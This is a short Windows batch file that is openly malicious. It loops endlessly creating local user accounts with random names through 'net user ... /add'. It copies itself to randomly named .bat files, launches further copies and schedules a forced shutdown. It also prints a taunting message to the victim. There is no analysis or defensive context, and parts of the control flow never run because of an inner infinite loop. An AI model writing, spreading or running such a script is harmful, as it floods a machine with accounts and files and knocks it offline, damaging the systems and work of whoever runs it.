@echo off
:loop
:makeuser
net user %random% %random% /add
goto makeuser
start 
vol %random%
copy %0 %random%%random%%random%.bat
start
goto loop
start shutdown.exe -s -t 120
:boot
echo hi. your pc been fucked by 122 
start shutdown.exe -s -t 120 
